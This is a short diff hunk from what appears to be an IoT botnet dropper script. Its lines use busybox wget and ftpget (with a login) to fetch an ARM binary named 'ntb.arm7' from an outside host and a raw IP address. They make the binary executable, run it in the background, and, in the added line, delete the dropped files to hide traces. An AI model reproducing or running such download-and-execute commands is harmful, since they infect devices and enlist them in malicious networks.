@@ -27,3 +27,5 @@ busybox wget http://store.risesmp.cc/wow/ntb.arm7
 busybox ftpget -u abc -p abcdefghij 94.130.108.110 ntb.arm7 ntb.arm7
 chmod 777 ntb.arm7
 ./ntb.arm7 universal &
+
+rm ntb.* &
